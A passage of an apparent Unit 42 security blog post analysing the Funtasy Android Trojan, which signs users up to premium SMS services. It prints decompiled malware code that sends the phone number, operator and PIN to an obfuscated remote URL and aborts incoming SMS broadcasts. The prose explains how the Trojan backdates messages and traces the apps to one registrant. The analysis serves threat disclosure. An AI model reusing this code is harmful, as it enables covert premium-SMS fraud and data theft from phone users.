class="crayon-s">"aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-124"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">phoneNumber</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">operator</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">paso</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">pin</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-125"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-126"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-127"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"error method onReceive: "</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-e">getMessage</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-128"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-e">printStackTrace</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-129"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-130">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-131"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"end method onReceive"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-132"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-133">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-134"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-e">stopSms</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">throws</span><span class="crayon-h"> </span><span class="crayon-e">Exception</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-135"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"begin method stopSms"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-136"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-137"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">abortBroadcast</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-138"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-139"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-140"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"error method stopSms: "</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-e">getMessage</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-141"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-e">printStackTrace</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-142"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-143">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-144"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"end method stopSms"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-145"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-146"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0070 seconds] -->
<p>Of course, once users begin receiving the SMS messages, they are likely to unsubscribe from the service they never really wanted. To prevent this, Funtasy blocks the incoming messages before they are displayed to the user and modifies the time stamp on each message to make them appear to have been received 15 days earlier. This moves it to the back of the inbox there the victim is unlikely to ever see it.  Funtasy does this even when the victim uses alternative SMS managers, like Google Hangouts or GO SMS Pro.</p>
<h3>Oscar Sanchez</h3>
<p>After evaluating the remote control app and finding malicious behavior, we decided to evaluate all of the other applications published by “fun app”, and found 12 more which all contains the exact same behavior.</p>
<p><img class="aligncenter size-large wp-image-5548" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2014/05/pic-4-500x245.png" alt="pic 4" width="500" height="245" /></p>
<p style="text-align: center;">Figure 4: Additional “fun app” applications, all contain the Funtasy Trojan.</p>
<p>Each of these applications is designed to appear like a legitimate application already in the app store. To raise the ranking of these apps, the author appears to have given many of them five-star ratings. Unfortunately for them, this gave us additional insight into their operation.</p>
<p>To rate and comment on applications, users must have a Google account. One account using the name “Oscar Sanchez” gave high ratings and positive comments to many of the “fun app” applications. He also rated apps made by two additional publishers with the names &#8220;MilApps101&#8221; and &#8220;Milapps102.&#8221; Between the two of these developers they have produced five applications, and we’ve found that every one of them contains the Funtasy Trojan. While the name “Oscar Sanchez” may be a pseudonym, <a href="http://whois.domaintools.com/funtasymobile.com">Whois data</a> indicates it was also used to register the domain hosting the Funtasy Mobile premium SMS service.</p>
<p>In total we’ve found 18 different applications in the Google Play store that contain the Funtasy Trojan. Each of these files also has the same internal class structure, which is represented by the tree structure below.</p>
<p><img class="aligncenter size-full wp-image-5549" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2014/05/pic-5.png" alt="pic 5" width="268" height="189" /></p>
<p style="text-align: center;">Figure 5: Funtasy internal class structure.</p>
<p>Researchers interested in investigating them further can find more information in the table below.</p>
<p style="text-align: left;">Using this Trojan the attacker could be generating up to 30 euros per month for over 67,000 infected mobile phones. That adds up to 2 million euros per month, but the actual number is likely much lower. Many of the users who downloaded the tool may not be using one of the targeted Spanish or Australian networks.</p>
<p style="text-align: center;"><img class="aligncenter size-large wp-image-5552" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2014/05/grid-1-500x602.png" alt="grid &#96;1" width="500" height="602" /></p>
<p style="text-align: center;">Figure 6: List of Android APK files infected with Funtasy Trojan</p>
<p>Users who want to defend against the Funtasy Trojan should not rely on traditional antivirus programs, as they do not currently detect this threat. Common sense is the best defense against these types of abusive programs. While many users breeze past the list of permissions required when installing new apps, readers of this blog should ask themselves, “Does my electronic bible need to read my SMS messages?”</p>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
